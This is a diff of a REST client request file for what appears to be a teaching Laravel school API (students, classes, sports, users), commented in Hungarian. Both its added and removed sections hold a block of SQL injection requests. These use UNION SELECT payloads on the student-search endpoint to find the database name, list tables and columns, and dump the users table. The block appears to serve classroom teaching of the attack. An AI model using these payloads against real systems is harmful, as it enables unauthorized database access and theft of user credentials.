@@ -4,7 +4,62 @@
 @port = 8000
 @host = {{protocol}}{{hostname}}:{{port}}
 
-# ------------- login, user -------------
+
+# ------------  lekérdezések ---------
+### get osztálynévsor
+get {{host}}/api/queryOsztalynevsor
+Accept: application/json
+
+
+### get osztálynévsor
+get {{host}}/api/queryOsztalynevsorObj
+Accept: application/json
+
+
+### get Valakinek az osztálytársai
+get {{host}}/api/queryOsztalytasrsak/Ubul
+Accept: application/json
+
+### get Lapozós osztálynévsor
+get {{host}}/api/queryOsztalynevsorLimit/1/4
+Accept: application/json
+
+### get Lapozós osztálynévsor
+get {{host}}/api/queryOsztalynevsorLimit/3/4
+Accept: application/json
+
+### get Oldalszám lekérdező
+get {{host}}/api/queryHanyOldalVan/4
+Accept: application/json
+
+### get diák kereső by név
+get {{host}}/api/queryDiakKeres/Feri
+Accept: application/json
+
+# sql injection
+### get mi az adatbázis neve
+get {{host}}/api/queryDiakKeres/Feri" union select database(), '', '', '', '', '', '', '', '', ''%23"
+Accept: application/json
+
+### get milyen táláink vannak
+get {{host}}/api/queryDiakKeres/Feri" union SELECT table_name, '', '', '', '', '', '', '', '', '' from information_schema.tables WHERE table_schema = 'laravel-iskola3'%23"
+Accept: application/json
+
+### A user tábla oszlopai
+get {{host}}/api/queryDiakKeres/Feri" union SELECT column_name, '', '', '', '', '', '', '', '', '' from information_schema.columns WHERE  table_name='users' AND  table_schema = 'laravel-iskola3'%23"
+Accept: application/json
+
+### get user adatok
+get {{host}}/api/queryDiakKeres/Feri" union select *, '', '' from users%23"
+Accept: application/json
+
+
+# ------------  /lekérdezések ---------
+
+
+
+
+# ------------  login, user ---------
 ### login
 # @name login
 POST {{host}}/api/users/login 
@@ -17,172 +72,179 @@ Content-Type: application/json
 }
 
 ###
-@token = {{login.response.body.data.token}}
+@token = {{login.response.body.user.token}}
 
-### logout user
-POST  {{host}}/api/users/logout
+### logout
+POST {{host}}/api/users/logout 
 Accept: application/json
+Content-Type: application/json
 Authorization: Bearer {{token}}
 
 
 ### get users
-GET  {{host}}/api/users
+get {{host}}/api/users
 Accept: application/json
 Authorization: Bearer {{token}}
 
-### get user by id
-GET  {{host}}/api/users/4
+### get user by Id
+get {{host}}/api/users/1
 Accept: application/json
 Authorization: Bearer {{token}}
+
 
 ### post user
-POST {{host}}/api/users 
-Content-Type: application/json
+post {{host}}/api/users
 Accept: application/json
+Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "name":  "test2",
-    "email": "test2@example.com",
+    "name": "test3",
+    "email": "test3@example.com",
     "password": "123"
 }
 
-### patch user
-PATCH {{host}}/api/users/5
-Content-Type: application/json
+### delete user by id
+delete {{host}}/api/users/4
 Accept: application/json
+Authorization: Bearer {{token}}
+
+### patch user by id
+patch {{host}}/api/users/2
+Accept: application/json
+Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
     "password": "1234"
 }
 
-### delete user
-DELETE {{host}}/api/users/4
-Content-Type: application/json
-Accept: application/json
-Authorization: Bearer {{token}}
-# ------------- /login, user -------------
 
+
+
+# ------------  teszt ---------
 ### teszt
 get {{host}}/api/
+# ------------ /teszt ---------
 
-# ---- sports ----
+# ------------  sport ---------
 ### get sports
 get {{host}}/api/sports
 
+
 ### get sport by id
-get {{host}}/api/sports/13
+get {{host}}/api/sports/2
 
-### post sports
-POST {{host}}/api/sports
+### post sport
+post {{host}}/api/sports
 Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "sportNev": "Csel"
+    "sportNev": "111"
 }
 
-### patch product
-PATCH {{host}}/api/sports/11
+### delete sport by id
+delete {{host}}/api/sports/13
+Accept: application/json
+Authorization: Bearer {{token}}
+
+### patch sport
+patch {{host}}/api/sports/9
 Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "sportNev": "Cselgáncsok"
+    "sportNev": "yyy"
 }
 
-### delete product by id
-DELETE {{host}}/api/sports/11
-Accept: application/json
-Content-Type: application/json
-Authorization: Bearer {{token}}
-# ---- /sports ----
+# ------------ /sport ---------
 
-
-# ---- osztalies ----
+# ------------  osztalies ---------
 ### get osztalies
 get {{host}}/api/osztalies
 
 ### get osztalies by id
-get {{host}}/api/osztalies/1
+get {{host}}/api/osztalies/2
 
-### post osztaly
-POST {{host}}/api/osztalies
+### post osztalies
+post {{host}}/api/osztalies
 Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "osztalyNev": "1.a"
+    "osztalyNev": "111"
 }
 
-### patch osztaly
-PATCH {{host}}/api/osztalies/1
+### delete osztalies by id
+delete {{host}}/api/osztalies/11
+Accept: application/json
+Authorization: Bearer {{token}}
+
+### patch sport
+patch {{host}}/api/osztalies/10
 Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "osztalyNev": "1.b"
+    "osztalyNev": "10a"
 }
 
-### delete product by id
-DELETE {{host}}/api/osztalies/1
-Accept: application/json
-Content-Type: application/json
-Authorization: Bearer {{token}}
-# ---- /osztalies ----
+# ------------ /osztalies ---------
 
 
-# ---- diaks ----
+# ------------  diaks ---------
 ### get diaks
 get {{host}}/api/diaks
 
 ### get diaks by id
-get {{host}}/api/diaks/1
+get {{host}}/api/diaks/2
 
-### post diak
-POST {{host}}/api/diaks
+### post diaks
+post {{host}}/api/diaks
 Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "osztalyId": 1,
-    "nev": "Zolika",
+    "osztalyId": 2,
+    "nev": "Etel",
     "neme": true,
     "szuletett": "2018-01-12",
     "helyseg": "Szolnok",
-    "osztondij": 5000.00,
-    "atlag": 3.7
+    "osztondij": "5000.00",
+    "atlag": 3.5
 }
 
-### patch diaks
-PATCH {{host}}/api/diaks/9
+### delete diaks by id
+delete {{host}}/api/diaks/8
+Accept: application/json
+Authorization: Bearer {{token}}
+
+### patch sport
+patch {{host}}/api/diaks/9
 Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "osztalyId": 200
+    "osztalyId": 20,
+    "helyseg": "Abony"
 }
 
-### delete diaks by id
-DELETE {{host}}/api/diaks/8
-Accept: application/json
-Content-Type: application/json
-Authorization: Bearer {{token}}
-# ---- /diaks ----
+# ------------ /diaks ---------
+
 
 # ---- sportolas ----
 ### get sportolas
 get {{host}}/api/sportolas
 
 ### get sportolas by id
-get {{host}}/api/sportolas/2/2
+get {{host}}/api/sportolas/2/5
 
 ### post sportolas
 POST {{host}}/api/sportolas
@@ -192,18 +254,18 @@ Authorization: Bearer {{token}}
 
 {
     "diakokId": 6,
-    "sportokId": 7
+    "sportokId": 6
 }
 
 ### patch sportolas
-PATCH {{host}}/api/sportolas/6/6
+PATCH {{host}}/api/sportolas/2/7
 Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 
 {
-    "diakokId":6,
-    "sportokId": 7
+    
+    "sportokId": 6
 }
 
 ### delete sportolas by id
@@ -212,47 +274,3 @@ Accept: application/json
 Content-Type: application/json
 Authorization: Bearer {{token}}
 # ---- /sportolas ----
-
-# ---- Lekérdezések -----
-###
-get {{host}}/api/queryOsztalynevsorok
-
-### get Valakinek az osztálytársai
-get {{host}}/api/queryOsztalytasrsak/Feri
-Accept: application/json
-
-### get Lapozós osztálynévsor
-get {{host}}/api/queryOsztalynevsorLimit/1/4
-Accept: application/json
-
-### get Lapozós osztálynévsor
-get {{host}}/api/queryOsztalynevsorLimit/2/4
-Accept: application/json
-
-### get Oldalszám lekérdező
-get {{host}}/api/queryHanyOldalVan/3
-Accept: application/json
-
-### get Diák keres
-get {{host}}/api/queryDiakKeres/Feri
-Accept: application/json
-
-
-#sql injection
-
-### Mi az adatbázis neve A zárójelek kódjai: (: %28, ): %29
-get {{host}}/api/queryDiakKeres/Feri" union select database%28%29, '', '', '', '', '', '', '', ''%23 
-Accept: application/json
-
-### Milyen táblák vannak?
-get {{host}}/api/queryDiakKeres/Feri" union select table_name, '', '', '', '', '', '', '', '' from information_schema.columns WHERE table_schema = 'laravel-iskola'%23 
-Accept: application/json
-
-### Milyen oszlopai vannak a user táblának?
-get {{host}}/api/queryDiakKeres/Feri" union select column_name, '', '','', '', '', '','','' from information_schema.columns WHERE table_name='diaks' AND table_schema = 'laravel-iskola'%23 
-Accept: application/json
-
-### user-ek adatainak ellopása A # url kódja: %23
-get {{host}}/api/queryDiakKeres/Feri" union select *,  '' from users%23 
-Accept: application/json
-
